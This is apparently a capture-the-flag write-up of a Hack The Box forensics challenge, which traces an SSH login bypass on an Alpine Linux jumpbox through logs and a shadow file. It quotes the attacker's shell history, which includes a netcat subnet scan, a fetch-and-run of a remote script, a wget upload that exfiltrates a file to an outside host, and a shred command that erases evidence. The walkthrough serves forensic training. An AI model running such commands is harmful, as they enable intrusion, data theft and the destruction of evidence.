---
title: SShole Walkthrough - HTB Very Easy Sherlock | SSH Exploit Forensics
description: Complete walkthrough of SShole from Hack The Box. A very easy DFIR Sherlock centered on a misconfigured Alpine Linux jumpbox. Analyzing `/var/log/messages` reveals an SSH login for the `adminsvc` user whose `/etc/shadow` field is `*`, and that disabled-account bypass is the SSHole vulnerability (CVE-2026-123158), where musl's `crypt()` returns `*` for an overlong password and matches the stored value. The `.ash_history` of the compromised user then exposes the internal network scan and the `wget --post-file` call used to exfiltrate a sensitive file to `https://devv.coding.eu/process`.
author: dua2z3rr
date: 2026-11-27 1:00:00
categories:
  - Sherlocks
  - HackTheBox
tags:
  - dfir
image: /assets/img/sshole/sshole-resized.png
---

## Challenge Description

Suspicious traffic was observed from a misconfigured jumpbox to a suspicious domain. You have been provided with evidence pulled from the jumpbox server. Determine how the attackers gained access to the server and what activity they performed afterwards.

## Artifacts

The zip to download contains four folders from the Linux filesystem:

```shell
ls  
etc  home  root  var
```

## Solution

### What Linux distribution name and version was the targeted server running?

We simply read the `os-release` file in the `/etc` folder.

```shell
cat os-release       
NAME="Alpine Linux"  
ID=alpine  
VERSION_ID=3.24.3  
PRETTY_NAME="Alpine Linux v3.24"  
HOME_URL="https://alpinelinux.org/"  
BUG_REPORT_URL="https://gitlab.alpinelinux.org/alpine/aports/-/issues"
```

**Answer:** `Alpine Linux 3.24.3`

### What is the CVE ID of the vulnerability abused by the attacker to gain access?

Even though we already know what the vulnerability is from the name of the Sherlock, let's figure out how to identify it. In the `/var/log/messages` file we can notice these events:

```log
grep "Accepted password" messages    
Nov  6 06:43:05 dev-jumpbox auth.info sshd-session[4617]: Accepted password for root from 192.168.72.131 port 53492 ssh2  
Nov  6 11:27:08 dev-jumpbox auth.info sshd-session[4852]: Accepted password for adminsvc from 192.168.72.1 port 61351 ssh2  
Nov  6 12:03:29 dev-jumpbox auth.info sshd-session[5407]: Accepted password for root from 192.168.72.131 port 43238 ssh2  
Nov  6 12:25:43 dev-jumpbox auth.info sshd-session[5425]: Accepted password for root from 192.168.72.131 port 47692 ssh2  
Nov  6 12:25:48 dev-jumpbox auth.err internal-sftp[5428]: error: process_write: write "/root/alpine/root/.cache/vmware/Nov  6 12:27:45 dev-jumpbox auth.info sshd-session[5432]: Accepted password for root from 192.168.72.131 port 44638 s  
sh2  
Nov  6 12:28:06 dev-jumpbox auth.info sshd-session[5436]: Accepted password for root from 192.168.72.131 port 44468 ssh2  
Nov  6 12:28:18 dev-jumpbox auth.info sshd-session[5440]: Accepted password for root from 192.168.72.131 port 36718 ssh2  
Nov  6 12:28:40 dev-jumpbox auth.info sshd-session[5444]: Accepted password for root from 192.168.72.131 port 47002 ssh2
```

Most of the connections are for root and are always accepted, while there is one for a user called adminsvc. If we go and look at the password hash of that user, we see that it doesn't have one.

```
root:$6$f4XOlG/We5wpezjh$Bep5mZyr76NljQ2vWEEw6sanaOal4KEZb9skOuUtAvp5DG8y0QgVnuGEWo4blYqP.XvnwYIm.8.pIX7C6ljiR1:20763:0:::::  
bin:!::0:::::  
daemon:!::0:::::  
lp:!::0:::::  
sync:!::0:::::  
shutdown:!::0:::::  
halt:!::0:::::  
mail:!::0:::::  
news:!::0:::::  
uucp:!::0:::::  
cron:!::0:::::  
ftp:!::0:::::  
sshd:!::0:::::  
games:!::0:::::  
ntp:!::0:::::  
guest:!::0:::::  
nobody:!::0:::::  
klogd:!:20763:0:99999:7:::  
adminsvc:*:20763:0:99999:7:::
```

When the password hash looks like that, it means the account is disabled and you can't log in with it. So how is it possible that a user logged in? That's exactly the SSHole vulnerability. Here's how it works:

> The attacker connects and offers a password between 257 and 1024 bytes for an account whose shadow field is `*`. That field holds no salt, so sshd borrows the salt from another account's $5$ or $6$ hash and calls crypt(). musl rejects the over-long key and returns `*`, which is exactly the stored value, so the comparison succeeds and sshd logs the attacker in.
{: .prompt-info }

**Answer:** `CVE-2026-123158`

### When did the attacker exploit the vulnerability?

For this question the previous log line is enough.

**Answer:** `2026-11-06 11:27:08`

### Which user account was abused by the attacker?

For this question the previous log line is enough.

**Answer:** `adminsvc`

### What string value causes the authentication bypass?

As we already saw, it's the asterisk in the `/etc/shadow` file that enables the attack.

**Answer:** `*`

### What command did the attacker use to scan the network reachable via the jumpbox, allowing them to target internal developer systems?

To see what commands the attacker ran, we can look at the command history of the compromised user.

```shell
cd home/adminsvc

cat .ash_history  
ls -la  
for ip in {1..254}; do nc -zvw 1 192.168.18.$ip 1-65535 2>&1 | grep -E "succeeded|open"; done  
vi scanreport.txt  
cat scanreport.txt    
bash <(wget -qO- https://raw.githubusercontent.com/papinyurii33/devscripts/refs/heads/main/setup.sh)  
ls -la /tmp  
ls -l /tmp/.devenv  
wget --post-file=/tmp/.devenv -O- https://devv.coding.eu/process  
shred -u /tmp/.devenv  
exit
```

**Answer:** `for ip in {1..254}; do nc -zvw 1 192.168.18.$ip 1-65535 2>&1 | grep -E "succeeded|open"; done`

### What was the exfiltration URI where the attacker exfiltrated a sensitive file?

We still see it in the command history, and we find it by looking for the only command that sends a file to a URL.

**Answer:** `https://devv.coding.eu/process`
